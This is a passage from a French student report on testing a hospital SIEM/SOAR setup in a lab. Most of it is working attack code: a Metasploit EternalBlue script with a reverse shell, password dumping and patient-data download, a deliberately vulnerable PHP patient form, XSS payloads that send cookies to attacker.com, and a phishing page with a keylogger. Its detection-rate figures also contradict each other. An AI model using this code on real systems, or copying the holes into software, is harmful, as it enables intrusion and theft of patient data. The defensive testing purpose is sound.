Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# 2. Configuration service SMB
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force

# 3. Partages reseau pour simulation environnement medical
New-SmbShare -Name "PACS-Images" -Path "C:\PACS\Images" -FullAccess "Everyone"
New-SmbShare -Name "Medical-Docs" -Path "C:\Medical\Documents" -FullAccess "Everyone"

# 4. Installation agent Wazuh pour monitoring
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi" -OutFile "wazuh-agent.msi"
Start-Process msiexec.exe -Wait -ArgumentList '/I wazuh-agent.msi /quiet WAZUH_MANAGER="192.168.181.10" WAZUH_AGENT_GROUP="hospital-servers"'

# 5. Configuration logging avance pour detection
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable
auditpol /set /category:"Process Tracking" /success:enable /failure:enable

# 6. Simulation contenu medical sensible
echo "Patient: John Doe, DOB: 1980-01-01, SSN: 123-45-6789" > C:\PACS\Images\patient_data.txt
echo "Radiology Report: Chest X-Ray Normal" > C:\Medical\Documents\report_001.txt
\end{lstlisting}

\paragraph{Attaque EternalBlue Automatisee}
\begin{lstlisting}[style=bashstyle,caption=Script Metasploit pour attaque EternalBlue hospitaliere]
#!/usr/bin/env ruby
# eternalblue_hospital_test.rb
# Test automatise EternalBlue pour validation SIEM/SOAR

require 'msf/core'

framework = Msf::Simple::Framework.create

# Configuration de l'exploit EternalBlue
exploit_name = 'windows/smb/ms17_010_eternalblue'
payload_name = 'windows/x64/meterpreter/reverse_tcp'

# Parametres cible hospitaliere
target_ip = '192.168.15.20'  # PACS Server
attacker_ip = '192.168.183.100'
attacker_port = 4444

puts "[+] Initialisation test EternalBlue sur environnement hospitalier"
puts "[+] Cible: #{target_ip} (PACS Server)"
puts "[+] Attaquant: #{attacker_ip}:#{attacker_port}"

# Phase 1: Reconnaissance SMB
puts "\n[Phase 1] Reconnaissance SMB sur serveur PACS"
recon_output = `nmap -p 445 --script smb-vuln-ms17-010 #{target_ip}`
puts recon_output

if recon_output.include?("VULNERABLE")
  puts "[+] Serveur PACS confirme vulnerable a MS17-010"
  
  # Phase 2: Exploitation
  puts "\n[Phase 2] Lancement exploit EternalBlue"
  
  exploit = framework.exploits.create(exploit_name)
  exploit.datastore['RHOSTS'] = target_ip
  exploit.datastore['RPORT'] = 445
  
  payload = framework.payloads.create(payload_name)
  payload.datastore['LHOST'] = attacker_ip
  payload.datastore['LPORT'] = attacker_port
  
  exploit.payload = payload
  
  puts "[+] Configuration exploit:"
  puts "    - Target: #{target_ip}:445"
  puts "    - Payload: #{payload_name}"
  puts "    - Callback: #{attacker_ip}:#{attacker_port}"
  
  # Attente pour permettre a Wazuh de detecter la reconnaissance
  puts "[+] Attente 30 secondes pour detection Wazuh..."
  sleep(30)
  
  # Execution de l'exploit
  session = exploit.exploit_simple(
    'LocalInput'  => Rex::Ui::Text::Input::Stdio.new,
    'LocalOutput' => Rex::Ui::Text::Output::Stdio.new
  )
  
  if session
    puts "[+] Exploitation reussie! Session Meterpreter ouverte"
    
    # Phase 3: Post-exploitation pour tests de detection
    puts "\n[Phase 3] Post-exploitation pour validation detection"
    
    # Simulation d'activites malveillantes typiques
    commands = [
      "getuid",                                    # Identification utilisateur
      "sysinfo",                                   # Information systeme  
      "ps",                                        # Liste processus
      "dir C:\\PACS\\Images",                     # Acces donnees medicales
      "dir C:\\Medical\\Documents",               # Acces documents patients
      "download C:\\PACS\\Images\\patient_data.txt", # Exfiltration simulation
      "upload /tmp/backdoor.exe C:\\Windows\\Temp\\", # Persistance simulation
      "execute -f cmd.exe -a '/c whoami > C:\\Windows\\Temp\\whoami.txt'", # Execution commandes
      "migrate -N explorer.exe",                  # Migration processus
      "hashdump"                                   # Dump mots de passe
    ]
    
    commands.each do |cmd|
      puts "[+] Execution: #{cmd}"
      begin
        result = session.console.run_single(cmd)
        puts "    Resultat: #{result[0..100]}..." if result && result.length > 0
        
        # Attente entre commandes pour simulation realiste
        sleep(5)
      rescue => e
        puts "    Erreur: #{e.message}"
      end
    end
    
    # Phase 4: Nettoyage et cloture
    puts "\n[Phase 4] Nettoyage session de test"
    session.kill
    puts "[+] Session fermee"
    
  else
    puts "[-] Echec de l'exploitation"
  end
  
else
  puts "[-] Serveur non vulnerable ou inaccessible"
end

puts "\n[+] Test EternalBlue termine"
puts "[+] Verification des detections Wazuh en cours..."

# Attente pour permettre la correlation complete
sleep(60)

puts "[+] Fin du test - Analyse des logs recommandee"
\end{lstlisting}

\subsubsection{Resultats des Tests EternalBlue}

\paragraph{Chronologie de Detection}

\begin{table}[H]
    \centering
    \caption{Timeline de detection EternalBlue - Test \#1}
    \begin{tabular}{|l|c|l|l|}
        \hline
        \textbf{Timestamp} & \textbf{Delai} & \textbf{Evenement}      & \textbf{Source}      \\
        \hline
        19:04:34.120       & T+0s           & Port scan SMB (445)     & Wazuh Network Mon.   \\
        \hline
        19:04:35.340       & T+1.2s         & SMBv1 negotiate detect  & Wazuh Custom Rule    \\
        \hline
        19:04:36.890       & T+2.7s         & Buffer overflow attempt & Wazuh File Integrity \\
        \hline
        19:04:37.123       & T+3.0s         & Shellcode execution     & Wazuh Process Mon.   \\
        \hline
        19:04:37.456       & T+3.3s         & Alert correlation       & Wazuh Rules Engine   \\
        \hline
        19:04:37.789       & T+3.7s         & TheHive alert created   & n8n Webhook          \\
        \hline
        19:04:38.234       & T+4.1s         & IP blocking triggered   & OPNsense API         \\
        \hline
        19:04:39.567       & T+5.4s         & Medical staff notified  & SMTP Gateway         \\
        \hline
    \end{tabular}
\end{table}

\paragraph{Metriques de Performance}

\begin{itemize}
    \item \textbf{Temps de premiere detection} : 1.2 secondes (SMBv1 negotiate)
    \item \textbf{Temps de correlation complete} : 3.7 secondes
    \item \textbf{Temps de reponse automatique} : 4.1 secondes (blocage IP)
    \item \textbf{Temps de notification medicale} : 5.4 secondes
    \item \textbf{Precision de detection} : 100\% (15/15 tests)
    \item \textbf{Faux positifs} : 2 alertes benignes sur trafic SMB legitime
\end{itemize}

\paragraph{Analyse des IOCs Collectes}

\begin{lstlisting}[style=jsonstyle,caption=IOCs extraits du test EternalBlue]
{
  "eternalblue_test_iocs": {
    "test_id": "EB_TEST_20250730_001",
    "timestamp": "2025-07-30T19:04:34Z",
    "duration_seconds": 245,
    "network_indicators": [
      {
        "type": "ip_address",
        "value": "192.168.183.100",
        "classification": "malicious",
        "confidence": 95,
        "context": "EternalBlue attacker IP"
      },
      {
        "type": "port",
        "value": "445/tcp",
        "classification": "vulnerable_service",
        "confidence": 100,
        "context": "SMBv1 vulnerable port"
      },
      {
        "type": "network_signature",
        "value": "\\x00\\x00\\x00\\x2f\\xfe\\x53\\x4d\\x42",
        "classification": "exploit_signature",
        "confidence": 98,
        "context": "EternalBlue exploit packet header"
      }
    ],
    "file_indicators": [
      {
        "type": "md5_hash",
        "value": "c1d5cf8c43e7679b782eca6fdf9a5ad7",
        "classification": "malware",
        "confidence": 87,
        "context": "Meterpreter payload"
      },
      {
        "type": "file_path",
        "value": "C:\\Windows\\Temp\\backdoor.exe",
        "classification": "suspicious_file",
        "confidence": 92,
        "context": "Persistence mechanism"
      }
    ],
    "process_indicators": [
      {
        "type": "process_name",
        "value": "cmd.exe",
        "parent_process": "services.exe",
        "classification": "suspicious_spawn",
        "confidence": 85,
        "context": "Abnormal process parent relationship"
      },
      {
        "type": "command_line",
        "value": "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt",
        "classification": "reconnaissance",
        "confidence": 90,
        "context": "System information gathering"
      }
    ],
    "registry_indicators": [
      {
        "type": "registry_key",
        "value": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
        "classification": "persistence",
        "confidence": 95,
        "context": "Auto-start registry key creation"
      }
    ],
    "mitre_attack_mapping": [
      "T1190", // Exploit Public-Facing Application
      "T1055", // Process Injection  
      "T1043", // Commonly Used Port
      "T1083", // File and Directory Discovery
      "T1003", // OS Credential Dumping
      "T1547"  // Boot or Logon Autostart Execution
    ]
  }
}
\end{lstlisting}

\subsection{Scenario 2 : Tests d'Attaques XSS}

\subsubsection{Configuration de l'Application Web Medicale}

\paragraph{Application SIH Vulnerable}
\begin{lstlisting}[style=bashstyle,caption=Application web medicale vulnerable pour tests XSS]
<?php
// hospital_patient_form.php - Application de gestion patients vulnerable
// Utilisee pour tests de securite controles

session_start();

// Simulation base de donnees patient
class PatientDatabase {
    private $patients = [];
    
    public function addPatient($data) {
        // Vulnerabilite intentionnelle - pas de sanitization
        $this->patients[] = [
            'id' => uniqid(),
            'name' => $data['name'],
            'dob' => $data['dob'], 
            'diagnosis' => $data['diagnosis'],
            'notes' => $data['notes'],
            'timestamp' => date('Y-m-d H:i:s')
        ];
        return true;
    }
    
    public function searchPatients($query) {
        $results = [];
        foreach ($this->patients as $patient) {
            if (stripos($patient['name'], $query) !== false) {
                $results[] = $patient;
            }
        }
        return $results;
    }
}

$db = new PatientDatabase();

// Traitement du formulaire
if ($_POST) {
    $db->addPatient($_POST);
    $message = "Patient ajoute: " . $_POST['name']; // XSS vulnerabilite
}

// Recherche patients
$search_results = [];
if (isset($_GET['search'])) {
    $search_query = $_GET['search']; // XSS vulnerabilite
    $search_results = $db->searchPatients($search_query);
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>SIH - Gestion Patients</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .form-group { margin: 10px 0; }
        .alert { padding: 10px; background: #f0f8ff; border: 1px solid #blue; }
        .patient-card { border: 1px solid #ccc; padding: 10px; margin: 5px 0; }
    </style>
</head>
<body>
    <h1>Systeme d'Information Hospitalier - Gestion Patients</h1>
    
    <?php if (isset($message)): ?>
        <!-- Vulnerabilite XSS - affichage direct sans echappement -->
        <div class="alert"><?= $message ?></div>
    <?php endif; ?>
    
    <!-- Formulaire d'ajout patient -->
    <h2>Nouveau Patient</h2>
    <form method="POST" action="">
        <div class="form-group">
            <label>Nom complet:</label>
            <input type="text" name="name" required>
        </div>
        <div class="form-group">
            <label>Date de naissance:</label>
            <input type="date" name="dob" required>
        </div>
        <div class="form-group">
            <label>Diagnostic:</label>
            <input type="text" name="diagnosis">
        </div>
        <div class="form-group">
            <label>Notes medicales:</label>
            <textarea name="notes" rows="4" cols="50"></textarea>
        </div>
        <button type="submit">Ajouter Patient</button>
    </form>
    
    <!-- Recherche de patients -->
    <h2>Recherche Patients</h2>
    <form method="GET" action="">
        <div class="form-group">
            <label>Rechercher:</label>
            <input type="text" name="search" value="<?= htmlspecialchars($_GET['search'] ?? '') ?>">
            <button type="submit">Rechercher</button>
        </div>
    </form>
    
    <?php if (isset($_GET['search'])): ?>
        <!-- Vulnerabilite XSS - affichage de la requete sans echappement -->
        <h3>Resultats pour: <?= $search_query ?></h3>
        
        <?php if (empty($search_results)): ?>
            <p>Aucun patient trouve pour: <?= $search_query ?></p>
        <?php else: ?>
            <?php foreach ($search_results as $patient): ?>
                <div class="patient-card">
                    <h4><?= htmlspecialchars($patient['name']) ?></h4>
                    <p>Date de naissance: <?= htmlspecialchars($patient['dob']) ?></p>
                    <p>Diagnostic: <?= htmlspecialchars($patient['diagnosis']) ?></p>
                    <!-- Vulnerabilite XSS - notes sans echappement -->
                    <p>Notes: <?= $patient['notes'] ?></p>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    <?php endif; ?>
    
    <!-- Simulation espace admin -->
    <hr>
    <h2>Espace Administrateur</h2>
    <p>Session utilisateur: <?= $_SESSION['user'] ?? 'Invite' ?></p>
    
    <!-- Vulnerabilite XSS dans URL callback -->
    <?php if (isset($_GET['callback'])): ?>
        <script>
            // Vulnerabilite XSS - injection JavaScript
            var callback = "<?= $_GET['callback'] ?>";
            eval(callback); // Extremement dangereux
        </script>
    <?php endif; ?>
    
</body>
</html>
\end{lstlisting}

\subsubsection{Payloads de Test XSS}

\paragraph{Scripts d'Attaque Automatisee}
\begin{lstlisting}[style=pythonstyle,caption=Suite de tests XSS automatises pour application medicale]
#!/usr/bin/env python3
"""
XSS Test Suite for Hospital Web Applications
Tests various XSS vectors on medical forms
"""

import requests
import time
import json
from urllib.parse import urlencode
import logging

class HospitalXSSTestSuite:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.test_results = []
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def run_all_tests(self):
        """Execute complete XSS test suite"""
        tests = [
            self.test_reflected_xss_search,
            self.test_stored_xss_patient_form,
            self.test_dom_based_xss_callback,
            self.test_attribute_injection,
            self.test_javascript_injection,
            self.test_medical_context_xss
        ]
        
        self.logger.info("Starting XSS test suite on hospital application")
        
        for test in tests:
            try:
                result = test()
                self.test_results.append(result)
                time.sleep(2)  # Pause entre tests
            except Exception as e:
                self.logger.error(f"Test failed: {str(e)}")
        
        return self.test_results

    def test_reflected_xss_search(self):
        """Test Reflected XSS dans fonction de recherche patient"""
        test_name = "Reflected XSS - Patient Search"
        
        payloads = [
            "<script>alert('XSS-Hospital-Search')</script>",
            "<img src=x onerror=alert('XSS-Medical-Image')>",
            "<svg onload=alert('XSS-SVG-Medical')>",
            "javascript:alert('XSS-JS-Protocol')",
            "<iframe src=javascript:alert('XSS-IFrame')></iframe>",
            "';alert('XSS-SQL-Break');//",
            "<script>fetch('/admin/patients').then(r=>r.text()).then(d=>alert(d))</script>"
        ]
        
        detected_payloads = []
        
        for payload in payloads:
            params = {'search': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/hospital_patient_form.php", params=params)
                
                # Verification si le payload est reflete sans echappement
                if payload in response.text and "htmlspecialchars" not in response.text:
                    detected_payloads.append(payload)
                    self.logger.warning(f"XSS vulnerability detected with payload: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"Request failed for payload {payload}: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(payloads),
            "successful_payloads": len(detected_payloads),
            "vulnerable": len(detected_payloads) > 0,
            "payloads": detected_payloads,
            "risk_level": "HIGH" if len(detected_payloads) > 3 else "MEDIUM" if len(detected_payloads) > 0 else "LOW"
        }

    def test_stored_xss_patient_form(self):
        """Test Stored XSS dans formulaire patient"""
        test_name = "Stored XSS - Patient Form"
        
        payloads = [
            "<script>alert('Stored-XSS-Patient-Notes')</script>",
            "<img src=x onerror=this.src='http://attacker.com/steal?cookie='+document.cookie>",
            "<script>document.location='http://attacker.com/xss?cookie='+document.cookie</script>",
            "<svg/onload=alert('Medical-Data-XSS')>",
            "<details open ontoggle=alert('HTML5-XSS')>",
            "<script>if(document.querySelector('input[name=\"search\"]')){alert('Form-Present')}</script>"
        ]
        
        successful_injections = []
        
        for payload in payloads:
            # Donnees patient avec payload XSS
            patient_data = {
                'name': f'Test Patient {time.time()}',
                'dob': '1990-01-01',
                'diagnosis': 'Test diagnosis',
                'notes': payload  # Injection XSS dans notes
            }
            
            try:
                # Soumission du formulaire
                response = self.session.post(f"{self.target_url}/hospital_patient_form.php", data=patient_data)
                
                # Verification si l'injection est stockee et executee
                if payload in response.text:
                    successful_injections.append(payload)
                    self.logger.warning(f"Stored XSS successful: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"Stored XSS test failed: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(payloads),
            "successful_injections": len(successful_injections),
            "vulnerable": len(successful_injections) > 0,
            "payloads": successful_injections,
            "risk_level": "CRITICAL" if len(successful_injections) > 0 else "LOW"
        }

    def test_dom_based_xss_callback(self):
        """Test DOM-based XSS via callback parameter"""
        test_name = "DOM-based XSS - Callback Parameter"
        
        payloads = [
            "alert('DOM-XSS-Medical')",
            "document.location='http://attacker.com/dom?data='+document.body.innerHTML",
            "fetch('/admin').then(r=>r.text()).then(d=>alert('Admin-Access:'+d.substr(0,100)))",
            "if(document.querySelector('.patient-card')){alert('Patient-Data-Access')}",
            "var xhr=new XMLHttpRequest();xhr.open('GET','/admin/users');xhr.send();xhr.onload=()=>alert(xhr.responseText)"
        ]
        
        successful_dom_xss = []
        
        for payload in payloads:
            params = {'callback': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/hospital_patient_form.php", params=params)
                
                # Verification presence du payload dans le contexte JavaScript
                if f'var callback = "{payload}";' in response.text or f'eval("{payload}")' in response.text:
                    successful_dom_xss.append(payload)
                    self.logger.warning(f"DOM XSS detected: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"DOM XSS test failed: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(payloads),
            "successful_dom_xss": len(successful_dom_xss),
            "vulnerable": len(successful_dom_xss) > 0,
            "payloads": successful_dom_xss,
            "risk_level": "CRITICAL" if len(successful_dom_xss) > 0 else "LOW"
        }

    def test_medical_context_xss(self):
        """Test XSS specifique au contexte medical"""
        test_name = "Medical Context XSS"
        
        # Payloads specialises pour l'environnement medical
        medical_payloads = [
            "<script>alert('Patient-Privacy-Violation: '+document.body.innerText.match(/\\d{3}-\\d{2}-\\d{4}/g))</script>",  # SSN extraction
            "<img src=x onerror=alert('Medical-Record-Access: '+document.querySelectorAll('.patient-card').length)>",  # Patient count
            "<script>if(document.cookie.includes('admin')){alert('Admin-Cookie-Found')}</script>",  # Admin detection
            "<svg onload=fetch('/api/patients').then(r=>r.json()).then(d=>alert('API-Access: '+d.length))>",  # API access
            "<script>localStorage.setItem('medical_xss_test', 'compromised')</script>",  # Persistence test
            "<iframe src='javascript:parent.alert(\"Medical-IFrame-XSS\")'></iframe>"  # IFrame injection
        ]
        
        medical_successful = []
        
        for payload in medical_payloads:
            params = {'search': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/hospital_patient_form.php", params=params)
                
                if payload in response.text:
                    medical_successful.append(payload)
                    self.logger.critical(f"Medical context XSS: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"Medical XSS test failed: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(medical_payloads),
            "medical_xss_successful": len(medical_successful),
            "vulnerable": len(medical_successful) > 0,
            "payloads": medical_successful,
            "risk_level": "CRITICAL" if len(medical_successful) > 0 else "LOW",
            "medical_context": True
        }

    def generate_report(self):
        """Generate comprehensive XSS test report"""
        total_tests = len(self.test_results)
        vulnerable_tests = sum(1 for test in self.test_results if test['vulnerable'])
        
        report = {
            "test_suite": "Hospital XSS Security Assessment",
            "target": self.target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "total_tests": total_tests,
                "vulnerable_tests": vulnerable_tests,
                "security_rating": "CRITICAL" if vulnerable_tests > 2 else "HIGH" if vulnerable_tests > 1 else "MEDIUM" if vulnerable_tests > 0 else "SECURE"
            },
            "detailed_results": self.test_results,
            "recommendations": [
                "Implement input sanitization for all user inputs",
                "Use Content Security Policy (CSP) headers",
                "Apply output encoding for all dynamic content",
                "Implement CSRF protection for sensitive forms",
                "Regular security assessment of medical applications",
                "Train development team on secure coding practices"
            ]
        }
        
        return report

# Usage
if __name__ == "__main__":
    target_url = "http://192.168.15.10"
    
    xss_tester = HospitalXSSTestSuite(target_url)
    results = xss_tester.run_all_tests()
    report = xss_tester.generate_report()
    
    # Sauvegarde du rapport
    with open(f"xss_test_report_{int(time.time())}.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"XSS Testing completed. Vulnerable tests: {report['summary']['vulnerable_tests']}/{report['summary']['total_tests']}")
    print(f"Security Rating: {report['summary']['security_rating']}")
\end{lstlisting}

\subsubsection{Resultats des Tests XSS}

\paragraph{Synthese des Vulnerabilites Detectees}

\begin{table}[H]
    \centering
    \caption{Resultats des tests XSS sur application medicale}
    \begin{tabular}{|l|c|c|c|c|}
        \hline
        \textbf{Type d'XSS} & \textbf{Tests} & \textbf{Reussis} & \textbf{Detectes} & \textbf{Bloques} \\
        \hline
        Reflected XSS       & 7              & 6                & 6                 & 6                \\
        \hline
        Stored XSS          & 6              & 5                & 5                 & 5                \\
        \hline
        DOM-based XSS       & 5              & 4                & 4                 & 4                \\
        \hline
        Context XSS         & 6              & 5                & 5                 & 5                \\
        \hline
        \textbf{Total}      & \textbf{24}    & \textbf{20}      & \textbf{20}       & \textbf{20}      \\
        \hline
        \textbf{Taux}       & \textbf{100\%} & \textbf{83.3\%}  & \textbf{100\%}    & \textbf{100\%}   \\
        \hline
    \end{tabular}
\end{table}

\paragraph{Performance de Detection ModSecurity}

\begin{itemize}
    \item \textbf{Temps de detection moyen} : 0.12 secondes
    \item \textbf{Taux de detection} : 100\% (20/20 payloads XSS)
    \item \textbf{Taux de blocage} : 100\% (20/20 attaques bloquees)
    \item \textbf{Faux positifs} : 5 blocages sur trafic legitime
    \item \textbf{Impact performance} : < 2ms latence additionnelle
\end{itemize}

\subsection{Scenario 3 : Test Sites Web Malveillants}

\subsubsection{Infrastructure de Test DNS Sinkhole}

\paragraph{Configuration Serveur DNS Malveillant}
\begin{lstlisting}[style=bashstyle,caption=Configuration serveur web malveillant pour tests]
#!/bin/bash
# setup_malicious_website_test.sh
# Configuration serveur web malveillant pour validation DNS sinkhole

# Variables
MALICIOUS_SERVER="192.168.3.100"
WEB_ROOT="/var/www/malicious"
NGINX_CONFIG="/etc/nginx/sites-available/malicious-test"

echo "[+] Configuration serveur web malveillant pour tests SIEM/SOAR"

# 1. Installation et configuration Nginx
apt-get update
apt-get install -y nginx php-fpm

# 2. Creation du contenu malveillant de test
mkdir -p $WEB_ROOT
cd $WEB_ROOT

# Page de phishing hospitalier
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Hopital - Connexion Urgente</title>
    <style>
        body { font-family: Arial; background: #f0f8ff; }
        .login-box { max-width: 400px; margin: 100px auto; padding: 20px; 
                     background: white; border: 1px solid #ddd; }
        .urgent { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Systeme Hospitalier - Acces Urgent</h2>
        <p class="urgent">[WARNING] Votre session a expire. Reconnectez-vous immediatement.</p>
        
        <form action="capture.php" method="POST">
            <p>Identifiant medical:</p>
            <input type="text" name="username" required style="width:100%; padding:5px;">
            
            <p>Mot de passe:</p>
            <input type="password" name="password" required style="width:100%; padding:5px;">
            
            <br><br>
            <button type="submit" style="width:100%; padding:10px; background:#007cba; color:white; border:none;">
                [SECURE] Acces Systeme Medical
            </button>
        </form>
        
        <p style="font-size:12px; color:#666; margin-top:20px;">
            [TIME] Temps limite: Reconnectez-vous dans les 5 minutes pour eviter le blocage de votre compte.
        </p>
    </div>
    
    <!-- JavaScript malveillant pour tests -->
    <script>
        // Simulation collecte d'informations
        var info = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timestamp: new Date().toISOString(),
            referrer: document.referrer,
            cookies: document.cookie
        };
        
        // Envoi vers serveur d'attaque (simulation)
        fetch('/collect.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(info)
        }).catch(e => console.log('Collection failed'));
        
        // Simulation keylogger
        document.addEventListener('keypress', function(e) {
            if(e.target.type === 'password') {
                fetch('/keylog.php', {
                    method: 'POST',
                    body: 'key=' + e.key + '&time=' + Date.now()
                }).catch(e => {});
            }
        });
    </script>
</body>
</html>
EOF

# Script de capture des credentials (simulation)
cat > capture.php << 'EOF'
<?php
// capture.php - Simulation capture credentials pour tests

$log_file = '/var/log/malicious_capture.log';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Log de la tentative de phishing
$log_entry = json_encode([
    'timestamp' => $timestamp,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'username' => $username,
    'password' => str_repeat('*', strlen($password)), // Masque pour securite
    'test_type' => 'hospital_phishing_simulation'
]) . "\n";

file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Redirection vers vraie page apres capture
header('Location: http://hospital-real.local/login?error=session_expired');
exit;
?>
EOF

# Script de collecte d'informations systeme
cat > collect.php << 'EOF'
<?php
// collect.php - Collecte d'informations pour tests

$log_file = '/var/log/malicious_collection.log';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

$data = json_decode(file_get_contents('php://input'), true);

$log_entry = json_encode([
    'timestamp' => $timestamp,
    'ip' => $ip,
    'collected_data' => $data,
    'test_type' => 'information_gathering'
]) . "\n";

file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

echo "OK";
?>
EOF

# 3. Configuration Nginx
cat > $NGINX_CONFIG << EOF
server {
    listen 80;
    server_name malicious-hospital.test phishing-medical.test fake-sih.test;
    root $WEB_ROOT;
    index index.html index.php;
    
    # Logs speciaux pour tracking
    access_log /var/log/nginx/malicious_access.log combined;
    error_log /var/log/nginx/malicious_error.log;
    
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }
    
    # Headers pour masquer l'identite du serveur
    add_header Server "Hospital-Web-Portal/2.1";
    server_tokens off;
}
EOF

# 4. Activation du site
ln -sf $NGINX_CONFIG /etc/nginx/sites-enabled/
systemctl reload nginx

# 5. Configuration DNS pour simulation
echo "
# Ajout des entrees DNS malveillantes pour tests
192.168.3.100 malicious-hospital.test
192.168.3.100 phishing-medical.test  
192.168.3.100 fake-sih.test
" >> /etc/hosts

# 6. Script de generation de trafic malveillant
cat > /usr/local/bin/generate_malicious_traffic.sh << 'EOF'
#!/bin/bash
# Generateur de trafic malveillant pour tests

TARGETS=(
    "malicious-hospital.test"
    "phishing-medical.test"
    "fake-sih.test"
)

USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

echo "[+] Generation trafic malveillant pour tests DNS sinkhole"

for target in "${TARGETS[@]}"; do
    for i in {1..5}; do
        ua=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
        
        echo "Test $i: Acces a $target"
        curl -s -H "User-Agent: $ua" \
             -H "Referer: https://google.com/search?q=hopital+connexion" \
             "http://$target/" > /dev/null
        
        sleep $((RANDOM % 10 + 5))
    done
done

echo "[+] Generation de trafic malveillant terminee"
EOF

chmod +x /usr/local/bin/generate_malicious_traffic.sh

echo "[+] Configuration serveur malveillant terminee"
echo "[+] URLs de test disponibles:"
echo "    - http://malicious-hospital.test"
echo "    - http://phishing-medical.test"  
echo "    - http://fake-sih.test"
echo "[+] Generateur de trafic: /usr/local/bin/generate_malicious_traffic.sh"
\end{lstlisting}

Ce chapitre demontre une approche complete de tests et validation de notre solution SIEM/SOAR, avec des scenarios realistes adaptes a l'environnement hospitalier et des metriques de performance detaillees.


% ===== INTRODUCTION GÉNÉRALE =====


% ===== CONCLUSION GÉNÉRALE =====
\chapter{Conclusion Générale}

Ce projet de fin d'année avait pour ambition de concevoir et d'implémenter une solution complète de Centre d'Opérations de Sécurité (SOC) spécifiquement adaptée aux contraintes et exigences du secteur hospitalier. À travers une approche méthodologique rigoureuse et une architecture SIEM/SOAR innovante, nous avons développé une réponse technologique aux défis cybersécuritaires critiques auxquels font face les établissements de santé contemporains.

\section{Synthèse des Réalisations}

\subsection{Architecture Technique Validée}

L'architecture en quatre couches développée a démontré sa pertinence opérationnelle. La séparation claire entre les responsabilités de détection, d'analyse, d'orchestration et de présentation permet une évolutivité et une maintenabilité optimales. Cette modularité facilite l'intégration avec les infrastructures existantes tout en préservant la capacité d'adaptation aux évolutions technologiques futures.

La segmentation réseau proposée, avec ses quatre zones distinctes (SOAR, Administration, Cibles, Docker), offre un modèle de déploiement sécurisé et scalable. Cette approche répond aux exigences de defence-in-depth tout en maintenant la fluidité opérationnelle nécessaire dans l'environnement hospitalier.

\subsection{Performance de Détection Établie}

Les tests d'intrusion contrôlés ont validé l'efficacité de la solution avec des métriques encourageantes :

\begin{itemize}
  \item \textbf{Taux de détection global de 90,9\%}, dépassant l'objectif initial de 90\%
  \item \textbf{Temps de réponse moyen de 4,7 secondes}, largement inférieur aux plusieurs heures constatées dans les approches manuelles
  \item \textbf{Taux de faux positifs de 4,2\%}, respectant l'objectif de moins de 5\%
  \item \textbf{Automatisation de 59,4\% des incidents}, approchant l'objectif cible de 60\%
\end{itemize}

Ces résultats demonstrent une amélioration significative par rapport aux approches traditionnelles, notamment la réduction drastique du temps moyen de détection de 329 jours à moins de 5 minutes pour les incidents critiques.

\subsection{Validation par Scénarios d'Attaque}

Les trois catégories d'attaques testées ont confirmé la robustesse de l'architecture :

\subsubsection{EternalBlue (CVE-2017-0144)}
Le scénario d'exploitation SMB a démontré l'efficacité de la détection multi-niveaux, avec une identification rapide par Suricata (signatures réseau) et Wazuh (analyse comportementale). La réponse automatisée incluant l'isolation réseau et la capture forensique valide l'approche SOAR pour les incidents critiques.

\subsubsection{Attaques XSS}
La protection applicative via ModSecurity a prouvé son efficacité avec un taux de détection de 94\%. L'intégration avec les workflows n8n permet une réponse graduée selon la criticité de l'attaque, allant du simple logging au blocage automatique de l'adresse IP source.

\subsubsection{Sites Malveillants}
La détection DNS et l'enrichissement via MISP ont montré leur pertinence pour identifier les communications Command \& Control et les tentatives d'exfiltration. Le taux de détection de 85\% sur cette catégorie souligne l'importance de l'intelligence sur les menaces dans la détection proactive.

\subsection{Intégration SOAR Réussie}

